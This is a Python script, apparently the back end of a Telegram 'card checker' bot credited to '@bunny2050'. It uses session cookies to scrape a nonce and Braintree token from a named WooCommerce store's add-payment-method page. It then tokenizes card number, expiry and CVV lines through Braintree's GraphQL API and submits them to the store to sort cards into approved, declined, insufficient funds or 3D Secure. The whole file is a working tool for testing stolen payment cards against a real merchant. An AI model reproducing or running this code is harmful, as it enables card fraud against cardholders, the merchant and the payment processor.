import requests
import re
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import json
import random
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
SELECTED_COOKIE_PAIR = None
ALL_COOKIE_PAIRS = []
user = generate_user_agent()

def load_cookie_dicts_from_files():
    """Load all cookie dictionaries from cookies_*.txt files in data folder."""
    cookie_dicts = []
    # Look for files in data folder
    data_folder = "data"
    if not os.path.exists(data_folder):
        data_folder = "."  # fallback to current directory
    
    filenames = ["cookies_1-1.txt", "cookies_1-2.txt"]
    for fname in filenames:
        filepath = os.path.join(data_folder, fname)
        if os.path.isfile(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                text = f.read()
                match = re.search(r'cookies\s*=\s*({.*?})\s*$', text, re.DOTALL)
                if match:
                    cookie_str = match.group(1)
                    try:
                        cookie_dict = eval(cookie_str, {"__builtins__": {}})
                        cookie_dicts.append(cookie_dict)
                        print(f"Successfully loaded cookies from {filepath}")
                    except Exception as e:
                        print(f"Failed to parse cookies in {filepath}: {e}")
        else:
            print(f"Cookie file not found: {filepath}")
    
    if not cookie_dicts:
        print("No cookie files found! Please check your cookie files.")
    
    return cookie_dicts

def select_new_cookie_pair_silent():
    """Randomly selects a cookie pair from all loaded cookies."""
    global SELECTED_COOKIE_PAIR, ALL_COOKIE_PAIRS
    if not ALL_COOKIE_PAIRS:
        ALL_COOKIE_PAIRS = load_cookie_dicts_from_files()
    if not ALL_COOKIE_PAIRS:
        raise RuntimeError("No cookies loaded!")
    SELECTED_COOKIE_PAIR = random.choice(ALL_COOKIE_PAIRS)

def get_cookies_2():
    """Returns the currently selected cookie pair for requests."""
    if SELECTED_COOKIE_PAIR is None:
        select_new_cookie_pair_silent()
    return SELECTED_COOKIE_PAIR

def get_domain_url():
    return "https://www.calipercovers.com"

def get_headers():
    return {
        'user-agent': user,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate',
        'connection': 'keep-alive',
        'upgrade-insecure-requests': '1',
    }

def get_new_auth():
    """Get nonce and authorization token from the website."""
    try:
        domain_url = get_domain_url()
        cookies_2 = get_cookies_2()
        headers = get_headers()
        
        # Get the add payment method page to extract nonce
        response = requests.get(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,
            headers=headers,
            verify=False,
            timeout=30
        )
        
        if response.status_code != 200:
            print(f"Failed to get add payment method page. Status: {response.status_code}")
            return None, None
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract nonce from the form
        nonce_input = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})
        if not nonce_input:
            print("Could not find nonce input field")
            return None, None
        
        add_nonce = nonce_input.get('value')
        if not add_nonce:
            print("Nonce value is empty")
            return None, None
        
        # Extract Braintree authorization token from script tags
        au_token = None
        script_tags = soup.find_all('script')
        
        for script in script_tags:
            if script.string:
                # Look for Braintree client token
                if 'client_token' in script.string or 'authorization' in script.string:
                    # Try to extract token using regex
                    token_match = re.search(r'"authorization":\s*"([^"]+)"', script.string)
                    if not token_match:
                        token_match = re.search(r'client_token["\']:\s*["\']([^"\']+)["\']', script.string)
                    if not token_match:
                        token_match = re.search(r'authorization["\']:\s*["\']([^"\']+)["\']', script.string)
                    
                    if token_match:
                        au_token = token_match.group(1)
                        break
        
        if not au_token:
            print("Could not extract Braintree authorization token")
            # Try alternative method - look for any base64-like token
            for script in script_tags:
                if script.string:
                    # Look for base64 encoded tokens (Braintree tokens are usually base64)
                    base64_matches = re.findall(r'[A-Za-z0-9+/]{50,}={0,2}', script.string)
                    for match in base64_matches:
                        try:
                            # Try to decode to see if it's valid base64
                            decoded = base64.b64decode(match + '==')  # Add padding
                            if b'braintree' in decoded.lower() or b'authorization' in decoded.lower():
                                au_token = match
                                break
                        except:
                            continue
                    if au_token:
                        break
        
        if not au_token:
            print("Warning: Could not find Braintree authorization token, using fallback method")
            return add_nonce, None
        
        print(f"Successfully extracted nonce and auth token")
        return add_nonce, au_token
        
    except Exception as e:
        print(f"Error in get_new_auth: {e}")
        return None, None

def get_random_proxy():
    # Return None if no proxy needed, or implement proxy rotation here
    return None

def check_status(message):
    """Parse response message and determine status."""
    message_lower = message.lower()
    
    # Success indicators
    if any(keyword in message_lower for keyword in [
        'payment method was successfully added',
        'successfully added',
        'success',
        'added successfully'
    ]):
        return "APPROVED", "Payment method added successfully", True
    
    # Specific error patterns
    if 'insufficient funds' in message_lower:
        return "INSUFFICIENT FUNDS", "Insufficient Funds", False
    
    if any(keyword in message_lower for keyword in [
        'invalid card',
        'card number is invalid',
        'invalid credit card'
    ]):
        return "DECLINED", "Invalid Card Number", False
    
    if 'expired' in message_lower:
        return "DECLINED", "Card Expired", False
    
    if any(keyword in message_lower for keyword in [
        'declined',
        'transaction declined',
        'payment declined'
    ]):
        return "DECLINED", "Transaction Declined", False
    
    if '3d secure' in message_lower or '3ds' in message_lower:
        return "3D SECURE", "3D Secure Required", False
    
    # Default to declined with the actual message
    return "DECLINED", message, False

def get_bin_info(bin_code):
    """Get BIN information - implement actual BIN lookup here."""
    # This is a stub - you should implement actual BIN lookup
    # You can use a BIN database or API service
    return {
        "brand": "UNKNOWN",
        "type": "UNKNOWN", 
        "level": "UNKNOWN",
        "bank": "UNKNOWN",
        "country": "UNKNOWN",
        "emoji": "🏳️",
    }

def check_card(cc_line):
    """Main function to check a credit card."""
    select_new_cookie_pair_silent()
    start_time = time.time()
    
    try:
        domain_url = get_domain_url()
        cookies_2 = get_cookies_2()
        headers = get_headers()
        
        # Get authentication tokens
        add_nonce, au = get_new_auth()
        if not add_nonce:
            return (
                "❌ <b>Braintree Auth</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "❌ Failed to get nonce. Check cookies/session.\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
            )

        # Parse card details
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return (
                "❌ <b>Braintree Auth</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "❌ Invalid card format. Use: number|month|year|cvv\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
            )
        
        n, mm, yy, cvc = parts
        
        # Ensure year is 4 digits
        if len(yy) == 2:
            yy = '20' + yy

        # If we have Braintree auth token, tokenize the card first
        if au:
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': f'cc600ecf-f0e1-4316-ac29-{random.randint(100000000000, 999999999999)}',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                            'billingAddress': {
                                'postalCode': '10080',
                                'streetAddress': '147 street',
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            headers_token = {
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'user-agent': user
            }
            
            proxy = get_random_proxy()
            response = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=headers_token,
                json=json_data,
                proxies=proxy,
                verify=False,
                timeout=30
            )
            
            if response.status_code != 200:
                return (
                    "❌ <b>Braintree Auth</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"❌ Tokenization failed. Status: {response.status_code}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
                )
            
            try:
                response_data = response.json()
                if 'errors' in response_data:
                    error_msg = response_data['errors'][0]['message']
                    return (
                        "❌ <b>Braintree Auth</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"❌ Tokenization error: {error_msg}\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
                    )
                
                token = response_data['data']['tokenizeCreditCard']['token']
            except (KeyError, TypeError) as e:
                return (
                    "❌ <b>Braintree Auth</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"❌ Failed to parse tokenization response: {e}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
                )
        else:
            # Fallback: try without tokenization (direct form submission)
            token = None

        # Submit payment method
        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'
        headers_submit['referer'] = f'{domain_url}/my-account/add-payment-method/'
        
        data = {
            'payment_method': 'braintree_cc',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        if token:
            data['braintree_cc_nonce_key'] = token
            data['braintree_cc_device_data'] = json.dumps({
                "correlation_id": f"cc600ecf-f0e1-4316-ac29-{random.randint(100000000000, 999999999999)}"
            })
        else:
            # Fallback data if no token
            data.update({
                'braintree_cc_cc_number': n,
                'braintree_cc_cc_exp': f"{mm}/{yy}",
                'braintree_cc_cc_cvc': cvc,
            })
        
        proxy = get_random_proxy()
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,
            headers=headers_submit,
            data=data,
            proxies=proxy,
            verify=False,
            timeout=30,
            allow_redirects=True
        )
        
        elapsed_time = time.time() - start_time
        
        # Parse response
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for various message containers
        message = "❌ Unknown error"
        
        # Check for WooCommerce notices
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        if error_div:
            message = error_div.get_text(strip=True)
        else:
            # Check for other common error containers
            for selector in [
                '.woocommerce-error',
                '.woocommerce-message', 
                '.woocommerce-info',
                '.notice-error',
                '.notice-success',
                '.alert',
                '.error',
                '.success'
            ]:
                element = soup.select_one(selector)
                if element:
                    message = element.get_text(strip=True)
                    break
        
        # If still no message found, check if we were redirected to payment methods page
        if 'payment-methods' in response.url and response.status_code == 200:
            message = "Payment method was successfully added"
        
        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        result = (
            f"{'✅' if approved else '❌'} <b>{status}</b>\n"
            f"<code>{n}|{mm}|{yy}|{cvc}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Gateway:</b> Braintree Auth\n"
            f"<b>Response:</b> {reason}\n"
            f"<b>BIN Info:</b> {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}\n"
            f"<b>Bank:</b> {bin_info.get('bank', 'UNKNOWN')}\n"
            f"<b>Country:</b> {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}\n"
            f"<b>Time:</b> {elapsed_time:.2f}s\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )
        return result

    except requests.exceptions.Timeout:
        return (
            "❌ <b>Braintree Auth</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ Request timeout. Try again later.\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )
    except requests.exceptions.RequestException as e:
        return (
            "❌ <b>Braintree Auth</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ Network error: {str(e)}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )
    except Exception as e:
        return (
            "❌ <b>Braintree Auth</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ Error: {str(e)}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )

def parse_check_card_result(result_text, default_card="", default_time=""):
    """Parse the result text and extract structured information."""
    card = default_card
    status_key = "declined"
    gateway = "Braintree Auth"
    response = ""
    bank = "Unknown Bank"
    country_flag = "🏳️"
    card_type = "Unknown"
    bin_code = "Unknown"
    check_time = default_time
    
    # Determine status
    if "APPROVED" in result_text:
        status_key = "approved"
    elif "DECLINED" in result_text:
        status_key = "declined"
    elif "INSUFFICIENT FUNDS" in result_text.upper():
        status_key = "insufficient_funds"
    elif "3D SECURE" in result_text.upper():
        status_key = "3d_issue"
    
    # Extract response
    match_resp = re.search(r"<b>Response:</b>\s?(.*?)\n", result_text)
    if match_resp:
        response = match_resp.group(1).strip()
    
    # Extract BIN info
    match_bin = re.search(r"<b>BIN Info:</b>\s?(.*?)\n", result_text)
    if match_bin:
        card_type = match_bin.group(1).strip()
    
    # Extract bank
    match_bank = re.search(r"<b>Bank:</b>\s?(.*?)\n", result_text)
    if match_bank:
        bank = match_bank.group(1).strip()
    
    # Extract country
    match_country = re.search(r"<b>Country:</b>\s?(.*?)\n", result_text)
    if match_country:
        country_flag = match_country.group(1).strip()
    
    # Extract BIN code and card
    match_card = re.search(r"<code>(\d{6})", result_text)
    if match_card:
        bin_code = match_card.group(1)
    
    if not card:
        match_full_card = re.search(r"<code>([^<]+)</code>", result_text)
        if match_full_card:
            card = match_full_card.group(1)
    
    # Extract time
    match_time = re.search(r"<b>Time:</b>\s?([\d\.]+s)", result_text)
    if match_time:
        check_time = match_time.group(1)
    
    return {
        "card": card,
        "gateway": gateway,
        "status_key": status_key,
        "response": response,
        "bank": bank,
        "country_flag": country_flag,
        "card_type": card_type,
        "bin_code": bin_code,
        "check_time": check_time
    }
